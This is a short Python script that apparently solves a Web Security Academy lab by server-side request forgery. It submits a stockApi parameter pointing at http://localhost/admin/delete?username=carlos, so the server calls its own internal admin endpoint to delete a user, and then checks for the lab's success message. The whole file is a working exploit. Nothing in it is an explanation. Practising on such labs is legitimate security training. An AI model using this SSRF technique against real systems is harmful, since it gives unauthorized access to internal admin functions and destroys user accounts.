import requests
import re
requests.packages.urllib3.disable_warnings()

# Edit the url
url = "https://0aa4003f03cd4d4181afc58500310037.web-security-academy.net/product/stock"

for_delete_user = {
    'stockApi': 'http://localhost/admin/delete?username=carlos'
}

global r
r = requests.Session()

def get_admin_dashboard():
    a = r.post(url, verify=False, data=for_delete_user)
    if "Congratulations" in a.text:
        print("Lab solved!")

if __name__ == "__main__":
    get_admin_dashboard()